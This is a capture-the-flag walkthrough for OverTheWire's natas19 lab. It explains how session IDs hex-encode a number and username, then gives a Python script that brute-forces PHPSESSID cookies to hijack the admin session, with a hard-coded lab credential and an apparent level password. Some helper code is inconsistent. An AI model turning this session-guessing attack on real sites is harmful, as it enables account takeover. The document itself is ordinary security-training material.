---
title: natas 19 walkthrough
description: over the wire natas 19
layout: libdoc_page
date: 1111-11-11
eleventyNavigation:
    key: natas-19 OverTheWire CTFs
    parent: OverTheWire CTFs
    title: natas 19 walkthrough
    order: 30
---
## Description
> Username: natas19
> 
> URL:      http://natas19.natas.labs.overthewire.org

---
## Progress
### Observation
Session ID are not sequential, but they seem similar.
### Analyze
Get 500 session IDs and analyze them.
It seems the session IDs always start with 3 and end with 2d226122. After strip those things. Session IDs can be divided into three parts: `[\d]`, `[3\d]`,`[3\d]`. Therefore, try them.
However, from the script, we cannot crack the session ID. After some tries, it seems that the session ID contains username in it, just right after the 2d22 part. `a` was encoded as `61`. `b` was encoded as `62`, and so on. It seems to be ascii in hex.
Therefore, we can guess there are three digits of number, and followed by `-<username>`.
### Script
```python
import requests
from bs4 import BeautifulSoup

def request_with_session_id(id :str):
    request_with_cookie({
        "PHPSESSID" : f"{id}",
    })

def request_with_cookie(cookies):
    header = {
        "Authorization" : "Basic bmF0YXMxOTo4TE1KRWhLRmJNS0lMMm14UUtqdjBhRURkazd6cFQwcw==",
    }
    url = "http://natas19.natas.labs.overthewire.org/index.php"
    response = requests.get(url, headers=header, cookies=cookies)
    soup = BeautifulSoup(response.text, 'html.parser')
    content = soup.select('#content')
    if response.status_code == 200:
        print(f"trying session id = {cookies["PHPSESSID"]}")
    if "You are an admin" in content.__str__():
        print(content)
        exit()
    elif "Please login with your admin account" in content.__str__():
        print(content)
        exit()
    else:
        pass

def add_characteristic(raw):
    return raw + "2d61646d696e"

def main():
    thirty = [str(i) for i in range(30, 40)]
    for part1 in thirty:
        request_with_session_id(add_characteristic(part1))
        for part2 in thirty:
            request_with_session_id(add_characteristic(part1+part2))
            for part3 in thirty:
                request_with_session_id(add_characteristic(part1+part2+part3))

def get_cookies():
    header = {
        "Authorization" : "Basic bmF0YXMxOTo4TE1KRWhLRmJNS0lMMm14UUtqdjBhRURkazd6cFQwcw==",
    }
    username = "admin"
    password = "AA"
    url = f"http://natas19.natas.labs.overthewire.org/index.php?username=\"{username}\"&password=\"{password}\""
    session_ids = []
    for i in range(300):
        response = requests.get(url, headers=header)
        session_ids.append(response.cookies.get("PHPSESSID"))
    print(session_ids)

def analyze_cookie():
    cookies = []
    for i in range(len(cookies)):
        if cookies[i][0] != "3":
            print(cookies[i])
            exit()
        elif cookies[i][-16:] != "2d61646d696e":
            print(cookies[i])
            exit()
        cookies[i] = cookies[i][1:-12]
    cookies.sort()
    print(cookies)

main()
```
guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH

---
## Hint

---
## Solving
### Category
- 
### Techniques
- 

### Tools
- 